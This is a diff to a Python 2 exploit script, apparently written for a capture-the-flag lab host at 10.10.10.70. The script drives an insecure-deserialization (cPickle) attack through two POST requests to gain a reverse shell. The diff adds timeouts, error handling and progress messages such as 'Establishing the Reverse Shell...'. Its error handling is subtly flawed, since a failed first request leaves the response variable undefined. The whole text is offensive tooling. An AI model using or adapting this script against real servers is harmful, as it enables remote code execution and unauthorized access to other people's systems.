@@ -348,6 +348,7 @@ import hashlib
 import cPickle
 import signal
 import sys
+import time
 
 # Global Variables.
 submit_url = "http://10.10.10.70/submit"
@@ -386,11 +387,21 @@ def makeRequests():
             "character": char,
             "quote": quote
             }    
-    response = requests.post(submit_url, data=submit_data) # Request to create the file.
+    
+    try:
+        response = requests.post(submit_url, data=submit_data, timeout=1) # Request to create the file.
+    except:
+        print("\n[!] The URL is not Active or something got wrong, check it and run again the Script!\n")
     if "Thank you for your suggestion!" in response.text:
+        print "\n[+] File created successfully!"
         encoded_input = hashlib.md5(char+quote).hexdigest() # Encode our input to use in the next request.
         check_data = {"id": encoded_input}
-        response2 = requests.post(check_url, data=check_data) # Request to exploit the Deserialization Attack.
+        time.sleep(1)
+        print "[+] Establishing the Reverse Shell..."
+        try:
+            response2 = requests.post(check_url, data=check_data, timeout=1) # Request to exploit the Deserialization Attack.
+        except:
+            pass
     else:
         print "\n[!] There's something wrong with your submit request! Try to run the program again!\n"
 
